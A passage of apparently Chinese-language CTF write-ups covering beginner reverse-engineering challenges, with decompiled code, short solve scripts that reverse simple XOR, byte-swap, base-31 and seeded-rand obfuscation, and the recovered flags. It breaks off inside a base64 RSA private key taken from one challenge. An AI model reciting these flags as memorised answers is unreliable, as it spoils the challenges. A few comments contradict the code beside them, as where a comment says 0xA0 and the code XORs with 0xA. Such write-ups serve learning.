class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#key = [135, 91, 149, 7, 215, 222, 193, 206, 108, 233, 219, 53, 164, 47, 181, 111, 123, 185, 25, 137]</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> ‘’<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nisactf-2022string"><a class="markdownIt-Anchor" href="#nisactf-2022string"></a> [NISACTF 2022]string</h2><h3 id="题目描述-7"><a class="markdownIt-Anchor" href="#题目描述-7"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">char *__fastcall flag(char *a1)&#123;  char *v1; &#x2F;&#x2F; rax  char *v2; &#x2F;&#x2F; rax  char *v3; &#x2F;&#x2F; rax  int v4; &#x2F;&#x2F; eax  char *v6; &#x2F;&#x2F; [rsp+8h] [rbp-38h]  int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-24h]  int j; &#x2F;&#x2F; [rsp+20h] [rbp-20h]  int k; &#x2F;&#x2F; [rsp+20h] [rbp-20h]  int v10; &#x2F;&#x2F; [rsp+24h] [rbp-1Ch]  int m; &#x2F;&#x2F; [rsp+28h] [rbp-18h]  int v12; &#x2F;&#x2F; [rsp+2Ch] [rbp-14h]  int v13; &#x2F;&#x2F; [rsp+34h] [rbp-Ch]  v6 &#x3D; a1;  v12 &#x3D; (_DWORD)a1 + 1;  if ( (_DWORD)a1 &lt;&lt; 30 )  &#123;    while ( 1 )    &#123;      v1 &#x3D; v6++;      if ( !*v1 )        break;      if ( !((_DWORD)v6 &lt;&lt; 30) )        goto LABEL_4;    &#125;  &#125;  else  &#123;LABEL_4:    for ( i &#x3D; (int)v6; ((i - 16843009) &amp; ~i &amp; 0x80808080) &#x3D;&#x3D; 0; i &#x3D; v13 )    &#123;      v13 &#x3D; v6[1];      v6 +&#x3D; 4;    &#125;    v2 &#x3D; v6++;    for ( j &#x3D; *v2; j; j &#x3D; *v3 )      v3 &#x3D; v6++;  &#125;  puts(&quot;This a magic!&quot;);  v10 &#x3D; (_DWORD)v6 - v12;  for ( k &#x3D; 0; (int)v6 - v12 &gt; k; ++k )    v10 ^&#x3D; 0x1Au;  if ( v10 !&#x3D; 13 )  &#123;    puts(&quot;error!&quot;);    exit(0);  &#125;  puts(&quot;The length of flag is 13&quot;);  srand(seed);  printf(&quot;NSSCTF&#123;&quot;);  for ( m &#x3D; 0; m &lt; 13; ++m )  &#123;    v4 &#x3D; rand();    printf(&quot;%d&quot;, (unsigned int)(v4 % 8 + 1));  &#125;  putchar(125);  return &amp;v6[-v12];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8"></a> exp</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123;int v4 &#x3D; 0;int seed &#x3D; 0x2766;srand(seed);for ( int l &#x3D; 0; l &lt; 13; ++l )&#123;v4 &#x3D; rand();printf(“%d”, (unsigned int)(v4 % 8 + 1));&#125;return 0;&#125;&#x2F;&#x2F;5353316611126<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>必须要linux写出来的程序得到的才是正确的答案，win的写出来是错的</p><p>这个是依赖于libc版本的, 如果libc的rand换了实现, 输出就变了</p><h2 id="nisactf-2022sign-ezc"><a class="markdownIt-Anchor" href="#nisactf-2022sign-ezc"></a> [NISACTF 2022]sign-ezc++</h2><h3 id="题目描述-8"><a class="markdownIt-Anchor" href="#题目描述-8"></a> 题目描述</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  Man *v3; &#x2F;&#x2F; rbx  Human *v4; &#x2F;&#x2F; rbx  std::string name; &#x2F;&#x2F; [rsp+20h] [rbp-20h] BYREF  char v7; &#x2F;&#x2F; [rsp+37h] [rbp-9h] BYREF  Human *m; &#x2F;&#x2F; [rsp+38h] [rbp-8h]  _main();  std::allocator&lt;char&gt;::allocator(&amp;v7);  std::string::string(&amp;name, &quot;NISACTF&quot;, &amp;v7);  v3 &#x3D; (Man *)operator new(0x18ui64);  Man::Man(v3, (std::string)&amp;name, 4);  m &#x3D; v3;  std::string::~string(&amp;name);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m);  v4 &#x3D; m;  if ( m )  &#123;    Human::~Human(m);    operator delete(v4);  &#125;  return 0;&#125;&#x2F;&#x2F;主函数看不懂一点，随便点点看看有没有什么有用信息，可以在human这个类中找到giveflag函数&#x2F;&#x2F;点进去一看发现是一个数组与0xA0异或<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"445959495E4C717E626379556379554443594B55786F5579636D6477"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;this_is_NISA_re_sign&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1超级签到"><a class="markdownIt-Anchor" href="#hnctf-2022-week1超级签到"></a> [HNCTF 2022 Week1]超级签到</h2><h3 id="题目描述-9"><a class="markdownIt-Anchor" href="#题目描述-9"></a> 题目描述</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token class-name">size_t</span> v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  <span class="token keyword">char</span> Str1<span class="token punctuation">[</span><span class="token number">224</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp+28h] BYREF</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+128h] [rbp+108h]</span>  v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">82</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v3 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">></span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> Str2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">111</span> <span class="token punctuation">)</span>      Str2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"input the flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%20s"</span><span class="token punctuation">,</span> Str1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"this is the right flag!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">sub_1400111D1</span><span class="token punctuation">(</span><span class="token string">"wrong flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//程序逻辑就是先替换然后再比较，很显然</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-10"><a class="markdownIt-Anchor" href="#exp-10"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">''</span>str2<span class="token operator">=</span><span class="token string">'&#123;hello_world&#125;'</span><span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># &#123;hell0_w0rld&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023ez_xor"><a class="markdownIt-Anchor" href="#litctf-2023ez_xor"></a> [LitCTF 2023]ez_XOR</h2><h3 id="题目描述-10"><a class="markdownIt-Anchor" href="#题目描述-10"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">__main();  strcpy(Str2, &quot;E&#96;&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;);  v9 &#x3D; 0;  v10 &#x3D; 0;  v11 &#x3D; 0;  v12 &#x3D; 0;  v13 &#x3D; 0;  v14 &#x3D; 0;  v15 &#x3D; 0;  printf(&quot;Enter The Right FLAG:&quot;);  scanf(&quot;%s&quot;, Str1);  XOR(Str1, 3);  if ( !strcmp(Str1, Str2) )  &#123;    printf(&quot;U Saved IT!\n&quot;);    return 0;  &#125;  else  &#123;    printf(&quot;Wrong!Try again!\n&quot;);    return main(v4, v5, v6);  &#125;&#x2F;&#x2F;XOR函数进去看是字符串每个字符异或3**3，逻辑很简单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-11"><a class="markdownIt-Anchor" href="#exp-11"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    i<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">9</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;XOR_1s_3asy_to_OR&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week2esy_flower"><a class="markdownIt-Anchor" href="#hnctf-2022-week2esy_flower"></a> [HNCTF 2022 WEEK2]e@sy_flower</h2><h3 id="题目描述-11"><a class="markdownIt-Anchor" href="#题目描述-11"></a> 题目描述</h3><p>把爆红的jmp花指令nop掉就能得到主函数的逻辑</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">v3 &#x3D; a1 - a2;  for ( i &#x3D; 0; i &lt; v3 &gt;&gt; 1; ++i )               &#x2F;&#x2F; 在循环内部，进行了一些对字符串的字节交换操作：就是奇数位和偶数位交换  &#123;    v5 &#x3D; *(_BYTE *)(a3 + 2 * i - 52);    *(_BYTE *)(a3 + 2 * i - 52) &#x3D; *(_BYTE *)(a3 + 2 * i - 51);    *(_BYTE *)(a3 + 2 * i - 51) &#x3D; v5;  &#125;  for ( j &#x3D; 0; j &lt; strlen((const char *)(a3 - 52)); ++j )&#x2F;&#x2F; 在第二个循环内部，对字符串中的每个字节执行异或操作，将其与0x30u（十进制为48）进行异或。    *(_BYTE *)(a3 + j - 52) ^&#x3D; 0x30u;  v7 &#x3D; strcmp((const char *)(a3 - 52), &quot;c~scvdzKCEoDEZ[^roDICUMC&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-12"><a class="markdownIt-Anchor" href="#exp-12"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"c~scvdzKCEoDEZ[^roDICUMC"</span>a3_<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    a3_<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a3_<span class="token punctuation">)</span>a3<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>a3_<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>a3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># SNCSFTJ&#123;su_tujknB_tyse&#125;s</span><span class="token comment"># NSSCTF&#123;Just_junk_Bytess&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bjdctf-2020justre"><a class="markdownIt-Anchor" href="#bjdctf-2020justre"></a> [BJDCTF 2020]JustRE</h2><h3 id="题目描述-12"><a class="markdownIt-Anchor" href="#题目描述-12"></a> 题目描述</h3><p>shift+f12查找字符串，看到一个BJD开头的像flag的东西，直接交叉引用，来到giveflag的函数</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)&#123;  CHAR String[100]; &#x2F;&#x2F; [esp+0h] [ebp-64h] BYREF  if ( a2 !&#x3D; 272 )  &#123;    if ( a2 !&#x3D; 273 )      return 0;    if ( (_WORD)a3 !&#x3D; 1 &amp;&amp; (_WORD)a3 !&#x3D; 2 )    &#123;      sprintf(String, &amp;Format, ++dword_4099F0);      if ( dword_4099F0 &#x3D;&#x3D; 19999 )      &#123;        sprintf(String, &quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;, 19999, 0);&#x2F;&#x2F;格式化输出        SetWindowTextA(hWnd, String);        return 0;      &#125;      SetWindowTextA(hWnd, String);      return 0;    &#125;    EndDialog(hWnd, (unsigned __int16)a3);  &#125;  return 1;&#x2F;&#x2F;可以直接看出flag就是BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛fakebase"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛fakebase"></a> [SWPUCTF 2021 新生赛]fakebase</h2><h3 id="题目描述-13"><a class="markdownIt-Anchor" href="#题目描述-13"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxx'</span>s_box <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjkzxcvb123456#$'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>b1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> b1<span class="token operator">//</span><span class="token number">31</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> s_box<span class="token punctuation">[</span>b1<span class="token operator">%</span><span class="token number">31</span><span class="token punctuation">]</span>    b1 <span class="token operator">=</span> b1<span class="token operator">//</span><span class="token number">31</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># s = u#k4ggia61egegzjuqz12jhfspfkay</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-13"><a class="markdownIt-Anchor" href="#exp-13"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 回到题目本身我们我肯可以得到s的值，其中s的值都是s_box中取的，因此[b1%31]是可以得知的。</span><span class="token comment"># 类似于十进制转二进制的“除二取余法”，但是循环成立条件为b1//31 != 0，所以缺少最后一个数，需要从0-30间进行爆破,进而得到num，转为flag</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>s_box <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjkzxcvb123456#$'</span>s <span class="token operator">=</span> <span class="token string">'u#k4ggia61egegzjuqz12jhfspfkay'</span>tmp<span class="token operator">=</span><span class="token string">''</span>num<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> final <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num<span class="token operator">=</span>final    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        num<span class="token operator">=</span>num<span class="token operator">*</span><span class="token number">31</span><span class="token operator">+</span>s_box<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"CTF"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NSSCTF&#123;WHAt_BASe31&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nisactf-2022ezpython"><a class="markdownIt-Anchor" href="#nisactf-2022ezpython"></a> [NISACTF 2022]ezpython</h2><h3 id="题目描述-14"><a class="markdownIt-Anchor" href="#题目描述-14"></a> 题目描述</h3><p>pyinstaller是对python打包的第三方库，这个地方是把python程序打包成exe了。。。那我们应该先去拿到原本python源代码。。</p><ul><li>拿到pyc字节码文件</li></ul><pre class="line-numbers language-none"><code class="language-none">python pyinstxtractor.py ez_python.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>拿到源代码<br />这个地方我是直接用uncompyle6就拿到源代码了</li></ul><pre class="line-numbers language-none"><code class="language-none">uncompyle6 src.py &gt; out.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><span class="token comment"># Version : Python 3.4</span><span class="token keyword">import</span> rsa<span class="token keyword">import</span> base64key1 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0